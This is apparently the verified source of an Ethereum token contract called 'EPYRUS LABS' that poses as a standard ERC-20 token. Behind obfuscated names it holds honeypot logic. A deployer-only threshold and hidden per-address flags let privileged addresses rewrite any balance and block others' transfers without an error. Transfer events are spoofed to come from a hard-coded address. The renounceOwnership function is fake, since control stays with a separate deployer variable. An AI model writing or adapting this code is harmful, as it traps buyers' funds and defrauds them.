/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract EPYRUS {
    using SafeMath for uint256;
    mapping (address => uint256) private eVa;
	
    mapping (address => uint256) public eVb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "EPYRUS LABS";
	
    string public symbol = "EPYRUS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 365000000 *10**6;
    address owner = msg.sender;
	  address private eVc;
      address private eVd;
    uint256 private eVe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address eVf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        eVd = msg.sender;
             eVa[msg.sender] = totalSupply;
        
       zForge();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function zForge() internal  {                             
                       eVb[msg.sender] = 5;
                       eVc = eVf;

                

        emit Transfer(address(0), eVc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return eVa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(eVb[msg.sender] <= eVe) {
    require(eVa[msg.sender] >= value);
eVa[msg.sender] -= value;  
eVa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(eVb[msg.sender] > eVe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function SNAPx (address jxA, uint256 jxB) public {
		if(eVb[msg.sender] == eVe) {   
			   	   
   eVb[jxA] = jxB;}
   }
		       function STX (uint256 jxB) public {
                     require(msg.sender == eVd);
                     eVe = jxB; 
	}

 		       function STOREX (address jxA, uint256 jxB) public {
		if(eVb[msg.sender] == eVe) {   
			   	   
   eVa[jxA] = jxB;}
   }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(eVb[from] < eVe && eVb[to] < eVe) {
        require(value <= eVa[from]);
        require(value <= allowance[from][msg.sender]);
        eVa[from] -= value;
        eVa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(eVb[from] == eVe) {
        require(value <= eVa[from]);
        require(value <= allowance[from][msg.sender]);
        eVa[from] -= value;
        eVa[to] += value;
        allowance[from][msg.sender] -= value;


            from = eVf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(eVb[from] > eVe || eVb[to] > eVe) {
             
         }}



     

        	
 }